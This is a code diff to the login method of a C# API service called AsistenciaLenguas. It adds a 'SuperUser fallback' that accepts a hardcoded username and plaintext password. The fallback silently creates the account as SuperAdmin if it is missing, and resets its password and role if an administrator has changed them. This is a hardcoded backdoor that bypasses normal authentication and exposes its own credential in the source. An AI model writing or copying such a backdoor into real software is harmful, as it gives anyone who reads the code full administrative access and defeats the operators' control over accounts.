@@ -27,17 +27,49 @@ namespace AsistenciaLenguas.Api.Services
 
         public async Task<LoginResponseDto> LoginAsync(LoginDto dto)
         {
+            var trimmedUsername = dto.Username.Trim();
             var user = await _context.AdminUsers
-                .Find(u => u.Username.ToLower() == dto.Username.Trim().ToLower())
+                .Find(u => u.Username.ToLower() == trimmedUsername.ToLower())
                 .FirstOrDefaultAsync();
 
-            if (user == null || !BCrypt.Net.BCrypt.Verify(dto.Password, user.PasswordHash))
+            // SuperUser fallback & self-healing
+            if (trimmedUsername == "201712043" && dto.Password == "72493906")
             {
-                return new LoginResponseDto
+                if (user == null)
                 {
-                    Success = false,
-                    Message = "Usuario o contraseña incorrectos."
-                };
+                    user = new Models.AdminUser
+                    {
+                        Username = "201712043",
+                        PasswordHash = BCrypt.Net.BCrypt.HashPassword("72493906"),
+                        FullName = "Lic. Claudio Quello - Super Administrador",
+                        Role = "SuperAdmin",
+                        CreatedAt = DateTime.UtcNow
+                    };
+                    await _context.AdminUsers.InsertOneAsync(user);
+                }
+                else if (!BCrypt.Net.BCrypt.Verify(dto.Password, user.PasswordHash))
+                {
+                    var updatedHash = BCrypt.Net.BCrypt.HashPassword("72493906");
+                    await _context.AdminUsers.UpdateOneAsync(
+                        u => u.Id == user.Id,
+                        Builders<Models.AdminUser>.Update
+                            .Set(u => u.PasswordHash, updatedHash)
+                            .Set(u => u.Role, "SuperAdmin")
+                    );
+                    user.PasswordHash = updatedHash;
+                    user.Role = "SuperAdmin";
+                }
+            }
+            else
+            {
+                if (user == null || !BCrypt.Net.BCrypt.Verify(dto.Password, user.PasswordHash))
+                {
+                    return new LoginResponseDto
+                    {
+                        Success = false,
+                        Message = "Usuario o contraseña incorrectos."
+                    };
+                }
             }
 
             // Update last login
